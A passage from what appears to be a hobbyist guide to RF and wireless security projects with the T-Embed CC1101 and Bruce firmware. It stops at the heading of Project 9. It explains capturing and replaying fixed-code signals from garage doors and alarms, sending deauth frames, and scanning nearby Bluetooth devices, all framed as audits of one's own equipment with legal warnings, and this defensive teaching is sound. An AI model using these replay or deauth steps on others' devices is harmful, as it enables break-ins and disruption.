---
layout: default
title: "11 — Practical Projects"
nav_order: 12
---

# 11 --- Practical Projects
{: .fs-9 }

25 real-world builds from beginner to expert. Each one teaches you something fundamental about RF, wireless security, and embedded systems.
{: .fs-6 .fw-300 }

---

{: .tip }
> These projects are designed to be completed in order. Each one builds on skills from the previous projects. If you jump ahead, you may need to reference earlier sections for foundational techniques.

{: .danger }
> **Every project in this guide must be performed on devices and networks you own or have explicit written authorization to test.** Unauthorized transmission, interception, or access is a federal crime. See [Chapter 13 --- Legal Reference](13-legal-reference/) for full details.

---

## Project 1: Personal RF Environment Audit
{: .d-inline-block }

Beginner
{: .label .label-green }

### Overview

Your home is full of invisible radio signals. Weather stations, doorbells, car key fobs, baby monitors, smart home sensors, utility meters --- they are all transmitting around you constantly. This project teaches you to systematically discover, identify, and document every signal in your environment.

### What You'll Learn

- How to use the CC1101's frequency analyzer across all supported bands
- Signal identification by modulation type, frequency, and timing
- Systematic scanning methodology
- Documentation practices used in professional RF surveys

### Materials Needed

- T-Embed CC1101 Plus with antenna
- Notebook or spreadsheet for logging
- (Optional) Computer with URH or rtl_433 for cross-reference

### Step-by-Step Instructions

**Step 1 --- Prepare Your Scanning Plan**

The CC1101 covers three frequency ranges with gaps between them. You need to scan each one systematically:

| Band | Range | Common Devices |
|:-----|:------|:---------------|
| Band 1 | 300--348 MHz | Older garage doors, some car fobs, industrial sensors |
| Band 2 | 387--464 MHz | Weather stations, doorbells, tire pressure monitors, key fobs |
| Band 3 | 779--928 MHz | Newer smart home devices, utility meters, LoRa, some garage doors |

**Step 2 --- Run the Frequency Analyzer**

Open Bruce firmware and navigate to:

```
Main Menu → RF → Frequency Analyzer
```

Start with Band 2 (387--464 MHz) because it is the most active in most homes. Let the analyzer run for at least 5 minutes. Every time the display shows a signal spike, note:

- Frequency (e.g., 433.92 MHz)
- Approximate signal strength
- Whether it repeats periodically or only on events
- Time of detection

**Step 3 --- Identify Periodic Transmitters**

Many devices transmit on a schedule. Weather stations typically send data every 30--60 seconds. Smart home sensors check in every few minutes. Leave the analyzer running for 15--30 minutes on each band and watch for patterns.

**Step 4 --- Trigger Event-Based Transmitters**

Some devices only transmit when activated:

- Press your doorbell
- Open/close a window or door with sensors
- Walk past a motion sensor
- Lock/unlock your car (stand at a safe distance)
- Press buttons on wireless remotes

Note the frequency and timing for each.

**Step 5 --- Attempt Signal Capture**

For each signal you found, switch to the Sub-GHz capture mode:

```
Main Menu → RF → Sub-GHz → Read
```

Set the frequency to what you observed. Try both common modulations:

- **AM (OOK/ASK)** --- Most consumer devices use this
- **FM (FSK/GFSK)** --- Some newer or digital devices

Capture a few transmissions from each device.

**Step 6 --- Build Your Frequency Map**

Create a document with this structure:

| # | Frequency | Modulation | Device | Interval | Signal Strength | Notes |
|:--|:----------|:-----------|:-------|:---------|:----------------|:------|
| 1 | 433.92 MHz | OOK | Weather station | 60s | Strong | Temp/humidity |
| 2 | 315.00 MHz | OOK | Doorbell | Event | Medium | Fixed code |
| 3 | 868.35 MHz | FSK | Smart plug | 120s | Weak | Encrypted |

### Expected Results

A typical home will reveal 5--15 active RF devices. You will likely find:

- At least one device on 433.92 MHz (the most common ISM frequency worldwide)
- Periodic transmitters you did not know existed (neighbor's weather station, nearby utility meters)
- A mix of OOK and FSK modulation types
- Varying signal strengths based on distance and obstructions

### Extensions

- Repeat the survey at different times of day (some devices are more active at certain times)
- Survey other locations you have permission to scan (office, workshop, vehicle)
- Use a computer with URH to decode the actual data in captured signals
- Map signal strengths by moving around your home to find transmitter locations

---

## Project 2: Universal IR Remote Replacement
{: .d-inline-block }

Beginner
{: .label .label-green }

### Overview

Capture the IR codes from every remote control in your home. Build organized profiles for each device. Replace your entire collection of remotes with the T-Embed.

### What You'll Learn

- IR signal capture and storage
- Protocol identification (NEC, Sony SIRC, RC-5, RC-6, Samsung, etc.)
- Building a personal IR code library
- The T-Embed's IR hardware capabilities and limitations

### Materials Needed

- T-Embed CC1101 Plus
- All your existing IR remote controls
- Fresh batteries in each remote (weak batteries = weak IR signal)
- (Optional) Smartphone camera to verify IR LED activity

### Step-by-Step Instructions

**Step 1 --- Inventory Your Remotes**

Walk through your home and collect every IR remote. Common ones:

- TV remote(s)
- Soundbar / audio receiver remote
- Streaming device remote (Roku, Fire TV, Apple TV)
- Air conditioner / fan remote
- Set-top box / cable box remote
- Projector remote
- LED strip / smart light remote

{: .tip }
> Not sure if a remote uses IR? Point it at your smartphone's front-facing camera and press a button. If you see a purple/white flash on screen, it is IR. (Most front cameras do not have IR filters.)

**Step 2 --- Set Up IR Capture**

Navigate to:

```
Main Menu → IR → Read
```

Point the remote directly at the T-Embed's IR receiver. Hold the remote 5--15 cm away for best results.

**Step 3 --- Capture Each Button Systematically**

For each remote, capture these buttons in order:

1. **Power** (most important)
2. **Volume Up / Down**
3. **Channel Up / Down** (if applicable)
4. **Mute**
5. **Input / Source**
6. **Menu / Home**
7. **Navigation arrows + OK/Select**
8. **Number pad** (0--9)
9. **Any device-specific buttons** (Netflix, settings, etc.)

After each capture, save it with a descriptive name:

```
TV_Power
TV_VolUp
TV_VolDown
TV_Mute
TV_Input
Soundbar_Power
Soundbar_VolUp
AC_Power
AC_TempUp
AC_TempDown
AC_Mode
```

**Step 4 --- Verify Each Code**

After capturing, immediately test by replaying:

```
Main Menu → IR → Saved → [select signal] → Send
```

Point the T-Embed at the target device and send. Verify the device responds correctly. If it does not:

- Re-capture at closer range
- Ensure the remote has fresh batteries
- Try capturing multiple times (some protocols send different data on alternating presses)

**Step 5 --- Organize Into Profiles**

Group your saved codes by device. Most firmware supports folders or profile organization. Create groups like:

```
/ir_codes/
├── living_room_tv/
├── bedroom_tv/
├── soundbar/
├── air_conditioner/
└── led_strips/
```

### Expected Results

- You should successfully capture 90--95% of IR codes from modern remotes
- NEC protocol devices (most common) will capture reliably every time
- Some protocols may show as "RAW" if the firmware does not recognize the encoding --- these still replay correctly
- Air conditioner remotes are the most complex (they send full state packets, not single commands) and may require multiple captures

### Extensions

- Add codes from the built-in TV-B-Gone database for devices you encounter outside your home
- Create "scene" macros that send multiple codes in sequence (e.g., "Movie Mode" = TV On + Soundbar On + Input HDMI2 + Lights Dim)
- Share your IR code library with the community
- Experiment with raw IR capture for devices that use unusual protocols

---

## Project 3: Weather Station Decoder
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

Most consumer weather stations transmit temperature, humidity, wind speed, and rain gauge data on 433 MHz using simple, unencrypted protocols. In this project, you will capture these transmissions, decode the protocol, and build a live weather display on the T-Embed's TFT screen.

### What You'll Learn

- RF protocol analysis and reverse engineering
- Binary data decoding (Manchester encoding, pulse width modulation)
- Using URH (Universal Radio Hacker) for signal analysis
- Cross-referencing with rtl_433's protocol database
- How weather sensors encode and transmit data

### Materials Needed

- T-Embed CC1101 Plus with antenna
- A wireless weather station (most transmit on 433.92 MHz)
- Computer with [URH](https://github.com/jopohl/urh) installed
- (Optional) RTL-SDR dongle for cross-verification with rtl_433

### Step-by-Step Instructions

**Step 1 --- Capture the Weather Station Signal**

Navigate to Sub-GHz capture and set the frequency to 433.92 MHz with OOK/ASK modulation. Most weather stations transmit every 30--60 seconds. Wait for a capture.

```
Main Menu → RF → Sub-GHz → Read
Frequency: 433.92 MHz
Modulation: AM (OOK)
```

Capture at least 5 separate transmissions. Save each one.

**Step 2 --- Analyze with URH**

Transfer the captured `.sub` files to your computer. Open them in URH:

1. Load the signal file
2. Switch to the **Analysis** tab
3. URH will attempt to auto-detect the modulation and bit encoding
4. Look for repeating patterns --- weather data is typically sent 2--3 times per transmission for reliability

**Step 3 --- Identify the Protocol Structure**

Most 433 MHz weather stations use a structure like this:

```
[Preamble] [Sync] [ID] [Channel] [Battery] [Temp] [Humidity] [Checksum]
  8 bits    4 bits  8b    2b        1b       12b      8b         8b
```

Compare your decoded bits against the known temperature and humidity values. If the weather station reads 72.5 degrees F and 45% humidity, look for:

- Temperature: Often transmitted as (value + offset) in tenths of a degree Celsius
- Humidity: Usually a direct percentage value
- ID: A fixed device identifier that changes when you reset the sensor

{: .tip }
> Cross-reference your findings with the [rtl_433 protocol list](https://github.com/merbanan/rtl_433). There are 200+ documented weather station protocols. Yours is probably already documented, which makes decoding much faster.

**Step 4 --- Build the Decoder Logic**

Once you understand the bit layout, write decoding logic:

```c
// Example: Decode temperature from captured bits
// Assuming bits 24-35 contain temperature as (value + 400) in tenths of °F
int raw_temp = (bits[24] << 11) | (bits[25] << 10) | ... ;
float temp_f = (raw_temp - 400) / 10.0;
float temp_c = (temp_f - 32.0) * 5.0 / 9.0;
```

**Step 5 --- Display Live Data**

If you are running custom firmware or have development access, create a TFT display layout:

```
┌──────────────────────┐
│   Weather Station    │
│                      │
│   Temp: 22.5°C       │
│   Humidity: 45%      │
│                      │
│   Last update: 30s   │
│   Signal: Strong     │
└──────────────────────┘
```

### Expected Results

- You will receive clear signal captures every 30--60 seconds
- Most consumer weather stations use well-documented protocols
- Temperature values will match your weather station's display within 0.1--0.5 degrees
- You may also pick up your neighbors' weather stations (each has a unique ID)

### Extensions

- Decode additional sensor data: wind speed, wind direction, rain gauge, UV index
- Build a logging system that records readings over time
- Compare multiple weather stations in your area
- Use the decoded protocol to build your own weather sensor transmitter (TX on ISM bands only)

---

## Project 4: Home Security RF Audit
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

This is a real penetration test applied to your own home. You will systematically test every RF-based security device for vulnerabilities, document your findings, and create a professional-grade security assessment report with remediation recommendations.

### What You'll Learn

- Penetration testing methodology applied to RF devices
- The difference between fixed codes and rolling codes (and why it matters)
- Vulnerability assessment and risk scoring
- Professional security reporting

### Materials Needed

- T-Embed CC1101 Plus with antenna
- Access to all RF security devices in your home
- Notebook or document for findings
- (Optional) Second person to operate devices while you capture

{: .danger }
> **Test only devices you own.** Capturing and replaying signals from your neighbor's garage door, gate, or alarm system is a federal crime under the CFAA and violates FCC regulations. No exceptions.

### Step-by-Step Instructions

**Step 1 --- Inventory Your RF Security Devices**

Document every RF-controlled security device in your home:

| Device | Location | Frequency | Brand/Model | Age |
|:-------|:---------|:----------|:------------|:----|
| Garage door opener | Garage | TBD | Chamberlain B2405 | 2019 |
| Gate remote | Front gate | TBD | LiftMaster | 2020 |
| Alarm system sensors | Windows/Doors | TBD | SimpliSafe | 2021 |
| Wireless doorbell | Front door | TBD | Ring (RF, not WiFi) | 2022 |
| Car key fob | Driveway | TBD | Toyota | 2023 |

**Step 2 --- Capture Signals from Each Device**

For each device, capture multiple transmissions:

1. Set the frequency analyzer to find the exact frequency
2. Switch to Sub-GHz capture mode
3. Activate the device (press the remote, trigger the sensor)
4. Capture at least 3 separate activations
5. Save each capture with a descriptive filename

**Step 3 --- Analyze for Fixed vs. Rolling Codes**

Compare your multiple captures of the same device:

**Fixed Code Indicators:**
- All captures produce identical or nearly identical signal data
- Signal structure is simple (short burst, simple encoding)
- Device is older (pre-2005 era designs)

**Rolling Code Indicators:**
- Each capture produces different data
- Signal is longer and more complex
- Device uses KeeLoq, AUT64, or similar algorithm
- Modern garage door openers (Chamberlain Security+ 2.0, etc.)

```
Fixed Code:   [A7 B3 C2 A7 B3 C2 A7 B3 C2]  ← Same every time
Rolling Code: [A7 B3 C2] [D1 E4 F5] [G8 H2 I9]  ← Different each time
```

**Step 4 --- Test Replay Vulnerability**

For devices that appear to use fixed codes:

1. Capture a signal
2. Wait 30 seconds
3. Replay the captured signal
4. Observe whether the device responds

{: .warning }
> If a device responds to a replayed signal, it is vulnerable to replay attacks. This means anyone with a $25 device could capture and replay the signal to activate that device. Document this as a **Critical** vulnerability.

**Step 5 --- Create Your Vulnerability Report**

Use this template for each device:

```
DEVICE: [Name]
LOCATION: [Where]
FREQUENCY: [MHz]
MODULATION: [OOK/FSK]
CODE TYPE: Fixed / Rolling / Encrypted
REPLAY VULNERABLE: Yes / No
RISK LEVEL: Critical / High / Medium / Low

FINDINGS:
[Description of what you discovered]

RECOMMENDATION:
[What to do about it]
```

**Risk Level Definitions:**

| Risk | Meaning | Example |
|:-----|:--------|:--------|
| **Critical** | Fixed code, replay works, secures physical access | Garage door with fixed code |
| **High** | Fixed code but limited impact | Doorbell with fixed code |
| **Medium** | Rolling code but other weaknesses exist | Older rolling code with known attacks |
| **Low** | Rolling code, properly implemented | Modern Security+ 2.0 garage opener |

**Step 6 --- Remediation Recommendations**

For each vulnerable device, provide actionable upgrades:

- **Fixed-code garage door**: Replace with Security+ 2.0 or myQ-compatible opener ($150--300)
- **Fixed-code gate remote**: Upgrade to rolling-code system or add secondary authentication
- **Unencrypted alarm sensors**: Upgrade to encrypted sensor protocol (e.g., SimpliSafe Gen 3)
- **Old car key fob**: Faraday pouch for storage, dealer reprogramming for newer protocol

### Expected Results

- Older devices (10+ years) are very likely to be fixed-code and vulnerable
- Modern garage door openers from major brands should use rolling codes
- Alarm system sensors vary widely --- some expensive systems still use fixed codes
- Car key fobs from 2015+ almost always use rolling codes
- You will likely find at least one vulnerable device

### Extensions

- Research specific attacks against rolling-code systems you find (RollJam, RollBack)
- Test at different distances to determine effective attack range
- Monitor for signal jamming (someone attempting to block your devices)
- Set up continuous monitoring to detect unauthorized RF signals near your security devices

---

## Project 5: Bluetooth Device Tracker / Counter
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

Build a portable BLE scanner that counts unique Bluetooth devices, identifies device types, tracks devices appearing and disappearing over time, and displays real-time statistics on the TFT. This is useful for foot traffic analysis, crowd density estimation, and understanding the BLE device landscape.

### What You'll Learn

- BLE advertising and scanning fundamentals
- MAC address types (public, random, resolvable)
- Device identification by advertisement data
- Data collection and visualization on embedded displays

### Materials Needed

- T-Embed CC1101 Plus (battery-powered for portability)
- External battery pack (JST connector)
- (Optional) Computer for post-analysis

### Step-by-Step Instructions

**Step 1 --- Understand BLE Advertisements**

Every Bluetooth device periodically broadcasts advertisement packets. These contain:

- MAC address (may be randomized)
- Device name (sometimes)
- Service UUIDs (indicate device type)
- Manufacturer data (company identifier)
- TX power level (allows distance estimation)

{: .note }
> Modern devices (iOS 14+, Android 10+) use **MAC address randomization**, which means the MAC address changes periodically. This makes exact device counting harder but not impossible --- manufacturer data and service UUIDs remain consistent.

**Step 2 --- Run a Passive BLE Scan**

Navigate to:

```
Main Menu → BLE → Scan
```

Let the scan run for 60 seconds. The T-Embed will discover all advertising BLE devices in range (typically 10--30 meters indoors, up to 100 meters outdoors with line of sight).

**Step 3 --- Categorize Discovered Devices**

Sort discovered devices by type using their advertisement data:

| Category | Identifier | Examples |
|:---------|:-----------|:---------|
| Phones | Apple (0x004C) or Google manufacturer data | iPhones, Pixels, Samsung |
| Wearables | Heart Rate Service UUID | Fitbit, Apple Watch, Garmin |
| Audio | Audio service UUIDs | AirPods, Bluetooth speakers |
| Beacons | iBeacon or Eddystone format | Retail beacons, Tile trackers |
| Smart Home | Specific service UUIDs | Smart locks, sensors, bulbs |
| Unknown | No identifiable data | Randomized, minimal advertisements |

**Step 4 --- Build a Counting Display**

Create a TFT display layout showing real-time counts:

```
┌──────────────────────┐
│  BLE Device Counter  │
│                      │
│  Total:     47       │
│  Phones:    23       │
│  Wearables:  8       │
│  Audio:      5       │
│  Beacons:    3       │
│  Other:      8       │
│                      │
│  New/min:    4       │
│  Lost/min:   2       │
│  Scan time: 12:34    │
└──────────────────────┘
```

**Step 5 --- Track Device Persistence**

Monitor which devices stay in range vs. pass through:

- **Stationary devices**: Same MAC/manufacturer data seen consistently (your own devices, nearby smart home equipment)
- **Transient devices**: Appear and disappear within minutes (people walking by, cars passing)
- **Periodic devices**: Appear at regular intervals (devices with long advertisement intervals)

Log entries with timestamps to build a traffic pattern:

```
12:00 - 12:05: 15 unique devices (3 new, 1 lost)
12:05 - 12:10: 17 unique devices (4 new, 2 lost)
12:10 - 12:15: 14 unique devices (1 new, 4 lost)
```

### Expected Results

- In a typical home, you will find 10--30 BLE devices (many you did not know about)
- Near a street or public area, the count will be significantly higher
- Apple devices will dominate in most US locations (iPhones, AirPods, Apple Watch)
- You will discover BLE devices you forgot about (old Fitbit in a drawer, smart light bulbs)
- MAC randomization will cause some overcounting --- expect 10--20% inflation

### Extensions

- Graph device count over 24 hours to see traffic patterns
- Estimate crowd size in public spaces (with appropriate consent/signage)
- Detect specific device types (e.g., count only Apple devices using manufacturer data)
- Build an alert system that notifies you when a new persistent device appears (potential security monitoring)
- Export data to CSV for analysis in a spreadsheet or Python

---

## Project 6: Portable WiFi Security Auditor
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

Build a portable WiFi security assessment workflow that scans all nearby networks, identifies security weaknesses, checks for common misconfigurations, monitors for rogue access points, and generates a clean report. Run this in your own home or office to understand your wireless security posture.

### What You'll Learn

- WiFi security fundamentals (WEP, WPA, WPA2, WPA3, OWE)
- Network reconnaissance techniques
- Common WiFi misconfigurations
- Rogue AP detection methodology
- Security assessment reporting

### Materials Needed

- T-Embed CC1101 Plus (WiFi uses the ESP32-S3 radio, not the CC1101)
- Charged battery for portable scanning
- Computer for report generation
- (Optional) Known-good network list for rogue AP comparison

{: .danger }
> **Scan only networks you own or have written authorization to audit.** Connecting to, deauthenticating, or interfering with networks you do not own is illegal under the CFAA and potentially under wiretapping laws.

### Step-by-Step Instructions

**Step 1 --- Perform a Full Network Scan**

Navigate to:

```
Main Menu → WiFi → Scan
```

Let the scan complete. It will discover all 2.4 GHz networks in range. For each network, note:

- SSID (network name)
- BSSID (access point MAC address)
- Channel
- Signal strength (RSSI)
- Encryption type (Open, WEP, WPA, WPA2, WPA3)
- Hidden networks (blank SSID)

**Step 2 --- Assess Each Network's Security**

Score each of your networks against this checklist:

| Check | Secure | Vulnerable |
|:------|:-------|:-----------|
| **Encryption** | WPA3 or WPA2 | WEP or Open |
| **SSID** | Custom name | Default (e.g., "NETGEAR-5G") |
| **Hidden** | Optional | Not a security measure by itself |
| **WPS** | Disabled | Enabled (PIN brute-force risk) |
| **Channel** | Non-overlapping (1, 6, 11) | Overlapping with neighbors |
| **Signal** | Appropriate for coverage area | Overpowered (leaks far outside) |

{: .warning }
> **WEP is completely broken.** If any of your networks still use WEP, upgrade immediately. WEP can be cracked in minutes with readily available tools.

**Step 3 --- Check for Default SSIDs**

Default SSIDs indicate the router was never properly configured:

- `NETGEAR-xxxx`, `Linksys-xxxx`, `TP-LINK_xxxx` --- likely still using default admin password
- `xfinitywifi`, `ATT-xxxx` --- ISP defaults, may have known vulnerabilities
- `DIRECT-xxxx` --- WiFi Direct, often has weak/no authentication

If any of your networks have default SSIDs, change them and update the admin password.

**Step 4 --- Monitor for Rogue Access Points**

A rogue AP is an unauthorized access point on your network or an evil twin mimicking your network. To detect them:

1. Create a baseline list of your known access points (SSID + BSSID + Channel)
2. Scan periodically and compare
3. Flag any new access points that match your SSID but have a different BSSID
4. Flag any unknown access points on your network's channels

```
BASELINE:
HomeNetwork    AA:BB:CC:DD:EE:FF    Channel 6
HomeNetwork_5G AA:BB:CC:DD:EE:00    Channel 36

ALERT - NEW AP DETECTED:
HomeNetwork    11:22:33:44:55:66    Channel 6    ← ROGUE AP!
```

**Step 5 --- Test Deauthentication Resilience (Your Own Network)**

Modern WPA3 networks with Protected Management Frames (PMF/802.11w) are immune to deauth attacks. Test your own network:

1. Connect a test device to your WiFi
2. Send a deauth frame targeting your own test device
3. If the device disconnects, your network is vulnerable to deauth
4. If the device stays connected, PMF is working

{: .tip }
> To enable PMF, update your router firmware and enable WPA3 or WPA2/WPA3 transition mode. Most routers manufactured after 2020 support this.

**Step 6 --- Generate Your Security Report**

```
═══════════════════════════════════════
       WiFi Security Audit Report
       [Your Name] — [Date]
       Location: [Your Home/Office]
═══════════════════════════════════════

NETWORK: HomeNetwork
  Encryption:  WPA2-PSK     [PASS - but recommend WPA3]
  SSID:        Custom       [PASS]
  WPS:         Disabled     [PASS]
  PMF:         Not enabled  [FAIL - vulnerable to deauth]
  Channel:     6            [OK]
  Admin login: Changed      [PASS]

OVERALL RISK: MEDIUM
RECOMMENDATIONS:
  1. Enable WPA3 transition mode
  2. Enable Protected Management Frames
  3. Update router firmware to latest version
```

### Expected Results

- Most home networks will show WPA2 (acceptable but improvable)
- You will likely find neighboring networks with poor security (do not test them)
- Default SSIDs are extremely common and indicate poor security hygiene
- PMF is rarely enabled on home networks, making them vulnerable to deauth
- The exercise will reveal security improvements you can make immediately

### Extensions

- Schedule weekly automated scans and compare against your baseline
- Test all IoT devices for WiFi security (smart bulbs, cameras, etc. often use weak encryption)
- Build a persistent rogue AP detector that alerts you in real time
- Audit guest network isolation (can guest devices reach your main network?)

---

## Project 7: Custom Sub-GHz Remote Control System
{: .d-inline-block }

Advanced
{: .label .label-red }

### Overview

Design and implement a custom RF communication protocol from scratch. Build a transmitter on the T-Embed and a receiver on a second ESP32. Create a multi-button remote with proper encoding, error detection, and basic encryption. This project teaches you how RF protocols actually work at the lowest level.

### What You'll Learn

- RF protocol design principles
- Manchester encoding and decoding
- Packet structure design (preamble, sync word, payload, checksum)
- Basic encryption for RF communications
- Two-device communication systems
- Error detection with CRC

### Materials Needed

- T-Embed CC1101 Plus (transmitter)
- Second ESP32 board with CC1101 module or 433 MHz receiver module (receiver)
- Breadboard and jumper wires
- LEDs or relay module for receiver output
- Arduino IDE or PlatformIO

{: .note }
> You can also use a second T-Embed CC1101 Plus as the receiver if you have one. The code is the same --- just different firmware roles.

### Step-by-Step Instructions

**Step 1 --- Design Your Protocol**

Before writing any code, design the packet structure on paper:

```
┌──────────┬──────────┬────────┬─────────┬─────────┬──────────┐
│ Preamble │ Sync Word│ Length │ Address │ Payload │ CRC-16   │
│ 4 bytes  │ 2 bytes  │ 1 byte │ 1 byte  │ N bytes │ 2 bytes  │
└──────────┴──────────┴────────┴─────────┴─────────┴──────────┘

Preamble:  0xAA 0xAA 0xAA 0xAA  (alternating bits for clock sync)
Sync Word: 0x2D 0xD4             (unique pattern to mark packet start)
Length:    Total payload length
Address:   Device address (0x01-0xFE, 0xFF = broadcast)
Payload:   Your data (button press, command, etc.)
CRC-16:    Error detection checksum
```

**Step 2 --- Define Your Command Set**

```c
// Command definitions
#define CMD_BUTTON_1    0x01  // Button 1 pressed
#define CMD_BUTTON_2    0x02  // Button 2 pressed
#define CMD_BUTTON_3    0x03  // Button 3 pressed
#define CMD_BUTTON_4    0x04  // Button 4 pressed
#define CMD_ALL_OFF     0x10  // All outputs off
#define CMD_ALL_ON      0x11  // All outputs on
#define CMD_TOGGLE      0x20  // Toggle specific output
#define CMD_STATUS_REQ  0x30  // Request status from receiver
#define CMD_PING        0xFF  // Keepalive ping
```

**Step 3 --- Implement Manchester Encoding**

Manchester encoding ensures clock synchronization by guaranteeing a transition in every bit period:

```c
// Manchester encode: each data bit becomes two bits
// Logic 0 → 01 (low-to-high transition)
// Logic 1 → 10 (high-to-low transition)

uint16_t manchester_encode(uint8_t byte) {
    uint16_t encoded = 0;
    for (int i = 7; i >= 0; i--) {
        encoded <<= 2;
        if (byte & (1 << i)) {
            encoded |= 0b10;  // 1 → high-low
        } else {
            encoded |= 0b01;  // 0 → low-high
        }
    }
    return encoded;
}
```

**Step 4 --- Add Basic Encryption**

Add a simple XOR cipher with a rolling counter to prevent replay attacks:

```c
// Simple encryption: XOR with key + rolling counter
uint8_t encrypt_byte(uint8_t data, uint8_t key, uint8_t counter) {
    return data ^ key ^ counter;
}

// Packet includes a counter field that increments with each transmission
// Receiver rejects packets with counter <= last received counter
```

{: .warning }
> XOR encryption is not cryptographically secure. For a real security application, use AES-128 (supported by the ESP32-S3 hardware). This project uses XOR for simplicity and learning --- never rely on it for actual security.

**Step 5 --- Write the Transmitter Firmware**

```c
#include <SPI.h>

// CC1101 configuration for custom protocol
void setupCC1101() {
    // Frequency: 433.92 MHz (ISM band)
    // Modulation: 2-FSK
    // Data rate: 4.8 kbps (reliable for beginners)
    // TX power: +10 dBm
    // Packet format: Variable length with CRC
}

void sendCommand(uint8_t address, uint8_t command) {
    uint8_t packet[8];
    packet[0] = address;
    packet[1] = command;
    packet[2] = counter++;
    packet[3] = encrypt_byte(command, SECRET_KEY, counter);

    // Calculate CRC-16
    uint16_t crc = crc16(packet, 4);
    packet[4] = crc >> 8;
    packet[5] = crc & 0xFF;

    // Transmit via CC1101
    cc1101_sendPacket(packet, 6);
}
```

**Step 6 --- Write the Receiver Firmware**

```c
void loop() {
    if (cc1101_packetAvailable()) {
        uint8_t packet[8];
        uint8_t len = cc1101_readPacket(packet, sizeof(packet));

        // Verify CRC
        if (!verifyCRC(packet, len)) {
            Serial.println("CRC error - packet dropped");
            return;
        }

        // Verify counter (anti-replay)
        if (packet[2] <= lastCounter) {
            Serial.println("Replay detected - packet dropped");
            return;
        }
        lastCounter = packet[2];

        // Decrypt and execute command
        uint8_t command = decrypt_byte(packet[3], SECRET_KEY, packet[2]);
        executeCommand(command);
    }
}

void executeCommand(uint8_t cmd) {
    switch (cmd) {
        case CMD_BUTTON_1: digitalWrite(LED_1, !digitalRead(LED_1)); break;
        case CMD_BUTTON_2: digitalWrite(LED_2, !digitalRead(LED_2)); break;
        case CMD_ALL_OFF:  allOutputsOff(); break;
        case CMD_ALL_ON:   allOutputsOn(); break;
    }
}
```

**Step 7 --- Test and Debug**

1. Flash the transmitter firmware to the T-Embed
2. Flash the receiver firmware to the second ESP32
3. Open Serial Monitor on the receiver
4. Press buttons on the T-Embed and verify the receiver responds
5. Test at increasing distances to find your range limit
6. Verify replay protection by capturing and replaying a signal --- the receiver should reject it

### Expected Results

- Reliable communication up to 50--100 meters in open air at +10 dBm
- 10--30 meter range indoors through walls
- Replay protection will successfully reject captured-and-replayed signals
- CRC will catch corrupted packets (test by partially obstructing the antenna)
- You will gain a deep understanding of how every RF remote control protocol works

### Extensions

- Add bidirectional communication (receiver sends acknowledgments)
- Implement AES-128 encryption using ESP32-S3 hardware acceleration
- Add frequency hopping for interference resistance
- Build a protocol analyzer that displays your custom packets on the TFT
- Increase the data rate for faster response time

---

## Project 8: Signal Replay Defense Tester
{: .d-inline-block }

Advanced
{: .label .label-red }

### Overview

Build a comprehensive tool that systematically tests your fixed-code devices against replay attacks, documents every vulnerability, and generates a remediation report with specific product upgrade recommendations. This is a formalized, repeatable security testing methodology.

### What You'll Learn

- Formalized vulnerability testing methodology
- Signal capture, storage, and replay techniques
- Vulnerability documentation and reporting
- Risk assessment and remediation planning
- The real-world security impact of fixed-code systems

### Materials Needed

- T-Embed CC1101 Plus with antenna
- All your RF-controlled devices (garage doors, gates, doorbells, etc.)
- Computer for report generation
- SD card for signal storage (if supported by firmware)

{: .danger }
> This project is exclusively for testing **your own devices**. Testing devices belonging to others --- neighbors, businesses, public infrastructure --- is a federal crime. Always have documentation proving ownership before testing.

### Step-by-Step Instructions

**Step 1 --- Create a Test Plan**

Before touching the T-Embed, document your test plan:

```
═══════════════════════════════════════
    RF Replay Defense Test Plan
    Tester: [Your Name]
    Date: [Date]
    Location: [Your Home Address]
    Authorization: Self (homeowner)
═══════════════════════════════════════

DEVICES UNDER TEST:
1. Garage door opener — [Brand/Model]
2. Wireless doorbell — [Brand/Model]
3. Fan remote — [Brand/Model]
4. LED strip remote — [Brand/Model]

TEST METHODOLOGY:
- Capture 3 signals per device
- Compare signals for fixed vs. rolling code
- Attempt replay for fixed-code devices
- Document all results
- Generate remediation report
```

**Step 2 --- Systematic Signal Capture**

For each device, capture three separate activations:

```
Capture 1: Press button → Save as [device]_capture_1
Wait 10 seconds
Capture 2: Press button → Save as [device]_capture_2
Wait 10 seconds
Capture 3: Press button → Save as [device]_capture_3
```

**Step 3 --- Compare Captures**

Analyze the three captures for each device:

| Result | Meaning | Vulnerability |
|:-------|:--------|:-------------|
| All 3 identical | Fixed code | **Critical** --- trivially replayable |
| All 3 different, structured | Rolling code | Low --- resistant to simple replay |
| All 3 different, random-looking | Encrypted rolling code | Very Low --- properly secured |
| 2 identical, 1 different | Hybrid or alternating code | **High** --- partially replayable |

**Step 4 --- Replay Test (Fixed-Code Devices Only)**

For devices with identical captures:

1. Move to normal operating distance from the device
2. Load the saved capture
3. Transmit the replay
4. Document whether the device activates

Record the results:

```
DEVICE: Ceiling fan remote
REPLAY RESULT: SUCCESS — Fan turned on
EFFECTIVE RANGE: 8 meters (same room)
RELIABILITY: 3/3 attempts successful
```

**Step 5 --- Generate Remediation Report**

For each vulnerable device, research and recommend specific replacements:

```
═══════════════════════════════════════
    VULNERABILITY: Garage Door Opener
    Risk Level: CRITICAL

    CURRENT STATE:
    - Fixed code on 315 MHz
    - 100% replay success rate
    - Any $25 device can clone access

    IMPACT:
    - Unauthorized physical access to garage
    - Access to home interior (if garage connects)
    - Vehicle theft if garage stores vehicles

    REMEDIATION OPTIONS:
    1. Replace opener: Chamberlain B6753T
       - Security+ 2.0 rolling code
       - myQ smart home integration
       - Cost: ~$280
       - Difficulty: DIY installation

    2. Add secondary security:
       - Deadbolt on garage-to-home door
       - Motion-activated camera in garage
       - Cost: ~$100-150
       - Difficulty: Easy

    PRIORITY: Immediate
═══════════════════════════════════════
```

### Expected Results

- Consumer devices like fan remotes, LED strip controllers, and wireless outlets almost always use fixed codes and will be replayable
- Garage door openers manufactured after 2005 usually use rolling codes (but verify --- some budget brands still use fixed codes)
- Car key fobs from the last 10 years should use rolling codes
- You will likely find 2--5 vulnerable devices in a typical home
- Non-security devices (fan remotes, LED strips) are low risk despite being vulnerable

### Extensions

- Test effective replay range for each device (how far away can you successfully replay?)
- Time-based analysis (do captured codes expire? Some systems invalidate old codes after a window)
- Build an automated scanner that tests for fixed codes across common frequencies
- Create a "defense grade" scoring system for your home's overall RF security

---

## Project 9: Multi-Band Spectrum Monitor
{: .d-inline-block }

Advanced
{: .label .label-red }

### Overview

